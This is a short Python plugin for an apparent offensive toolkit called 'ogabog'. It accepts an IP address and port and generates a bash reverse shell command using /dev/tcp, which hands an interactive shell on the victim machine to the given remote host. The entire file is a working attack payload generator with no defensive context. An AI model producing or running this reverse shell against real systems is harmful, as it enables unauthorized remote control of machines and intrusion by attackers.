from ogabog.cores import plugin


class ReverseShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--ip",
            help="IP address"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "Generate reverse shell using bash"

    def make_shell(self):
        self.shell = """bash -i >& /dev/tcp/{}/{} 0>&1""".format(self.args.ip, self.args.port)

